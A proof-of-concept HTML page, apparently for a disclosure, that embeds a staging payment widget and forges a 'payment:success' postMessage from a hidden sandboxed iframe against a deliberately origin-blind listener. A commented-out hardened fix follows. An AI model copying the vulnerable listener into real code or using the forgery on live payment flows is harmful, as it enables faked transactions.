<!doctype html>
<meta charset="utf-8" />
<title>postMessage Origin/Source Check – PoC</title>
<style>
  body { font: 14px/1.45 system-ui; margin: 24px; }
  input, button { font: inherit; }
  #log { white-space: pre-wrap; background: #111; color: #0f0; padding: 10px; border-radius: 8px; min-height: 140px; }
  iframe { border: 1px solid #ccc; }
  .row { margin: 8px 0; }
  .muted { color: #888; }
</style>

<h1>PoC: Missing <code>e.origin</code>/<code>e.source</code> validation</h1>
<ol>
  <li>Embeds the real widget iframe (staging).</li>
  <li>Parent has a <b>vulnerable</b> message listener (only checks <code>uuid</code>).</li>
  <li>A sandboxed “attacker” iframe (origin = <code>null</code>) forges a message via <code>postMessage</code>.</li>
</ol>

<div class="row">
  Widget URL:
  <input id="widgetUrl" size="90"
         value="https://multipay.staging.komoju-dev.com/widget.html?uuid=DEMO-UUID-123" />
  <button id="embed">Embed widget & auto-forge</button>
</div>

<div class="row">
  Forge event:
  <input id="eventName" value="payment:success" />
  Amount: <input id="amount" value="1" size="4" />
  Currency: <input id="currency" value="USD" size="5" />
  <button id="send">Send forged postMessage</button>
  <span class="muted">| forged message comes from sandboxed iframe → <code>origin = "null"</code></span>
</div>

<h2>Log</h2>
<div id="log">(no events yet)</div>

<!-- Real widget iframe -->
<div class="row">
  <iframe id="victim" width="420" height="280" title="Widget iframe"></iframe>
</div>

<!-- Attacker iframe: sandboxed + srcdoc (opaque origin => e.origin === "null") -->
<iframe id="attacker" width="0" height="0" style="visibility:hidden"
  sandbox="allow-scripts"
  srcdoc='<!doctype html><meta charset="utf-8">
<script>
// Wait for parent to send us a config; then forge a message back to parent.
// Note: this frame is sandboxed, so its origin is "null".
window.addEventListener("message", (e) => {
  if (!e || !e.data || e.data.type !== "config") return;
  const { uuid, evt, amount, currency } = e.data;
  const payload = { uuid: uuid, event: evt, amount: Number(amount), currency: currency };
  parent.postMessage(payload, "*"); // send forged message to parent (origin will be "null")
});
</script>
<body>attacker ready</body>'></iframe>

<script>
  // ---------- Utilities ----------
  const $ = (id) => document.getElementById(id);
  function logLine(text){
    const el = $('log');
    el.textContent = (el.textContent === '(no events yet)' ? '' : el.textContent + '\n') + text;
  }
  function log(...args){
    const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
    logLine(line);
  }
  function getUuidFrom(url){
    try { return new URL(url).searchParams.get('uuid') || ''; }
    catch(_){ return ''; }
  }

  // Keep CURRENT_UUID synced with the URL input
  let CURRENT_UUID = getUuidFrom($('widgetUrl').value);
  $('widgetUrl').addEventListener('input', ()=> {
    CURRENT_UUID = getUuidFrom($('widgetUrl').value);
  });

  // ---------- Helper to label source (widget vs attacker) ----------
  const victim = document.getElementById('victim');
  function whoSent(e){
    try { return (e.source === victim.contentWindow) ? '[from WIDGET]' : '[from ATTACKER/other]'; }
    catch(_){ return '[from ATTACKER/other]'; }
  }
  // Console tap to help screenshots / devtools
  window.addEventListener('message', (e) => {
    console.log(whoSent(e), 'origin=', e.origin, 'data=', e.data);
  });

  // ---------- Vulnerable parent listener (demonstrates the bug) ----------
  window.addEventListener('message', (e) => {
    //VULNERABLE: no origin/source verification — accepts any sender that matches uuid
    if (e && typeof e.data === 'object' && e.data.uuid && e.data.uuid === CURRENT_UUID) {
      log(`${whoSent(e)}  [Parent] DISPATCH (vulnerable): origin=${String(e.origin)} event=${e.data.event} data=${JSON.stringify(e.data)}`);
    } else {
      log(`${whoSent(e)}  [Parent] Ignored message: origin=${String(e.origin)} data=${JSON.stringify(e.data)}`);
    }
  });

  // Send config to attacker iframe (cross-origin safe)
  function sendConfigToAttacker(uuid, evt, amount, currency){
    const attackerWin = $('attacker').contentWindow;
    attackerWin.postMessage({ type: 'config', uuid, evt, amount, currency }, '*');
  }

  // ---------- 1) Embed widget & auto-forge ----------
  $('embed').onclick = () => {
    const url = $('widgetUrl').value.trim();
    $('victim').src = url;
    log('[Parent] Embedded widget:', url);

    // After a short delay, instruct attacker to forge the message
    setTimeout(() => {
      const uuid = getUuidFrom(url) || 'DEMO-UUID-123';
      sendConfigToAttacker(uuid, 'payment:success', 1, 'USD');
      log('[Parent] Asked attacker to forge message with uuid =', uuid);
    }, 1200);
  };

  // ---------- 2) Manual forged send ----------
  $('send').onclick = () => {
    const url = $('widgetUrl').value.trim();
    const uuid = getUuidFrom(url) || 'DEMO-UUID-123';
    const evt  = $('eventName').value.trim() || 'payment:success';
    const amt  = $('amount').value.trim() || '1';
    const cur  = $('currency').value.trim() || 'USD';

    sendConfigToAttacker(uuid, evt, amt, cur);
    log('[Parent] Asked attacker to forge message with uuid =', uuid);
  };

  // ---------- (Optional) Hardened listener (contrast / fix) ----------
  // Uncomment this block to demonstrate the proper fix that rejects the forged message:
  /*
  (function addHardenedListener(){
    let expectedOrigin = null;
    let childWindow = null;

    const setHandles = () => {
      try {
        const url = $('widgetUrl').value.trim();
        expectedOrigin = new URL(url).origin;             // e.g., https://multipay.staging.komoju-dev.com
      } catch(_) { expectedOrigin = null; }
      childWindow = $('victim').contentWindow || null;
    };
    setHandles();
    $('embed').addEventListener('click', () => setTimeout(setHandles, 0));

    window.addEventListener('message', (e) => {
      if (!expectedOrigin || !childWindow) return;
      if (e.origin !== expectedOrigin) return;            // origin check
      if (e.source !== childWindow) return;               // window identity check
      if (e && typeof e.data === 'object' && e.data.uuid === CURRENT_UUID) {
        log(`[from WIDGET]  [Parent] DISPATCH (hardened): origin=${String(e.origin)} event=${e.data.event} data=${JSON.stringify(e.data)}`);
      }
    });
  })();
  */
</script>
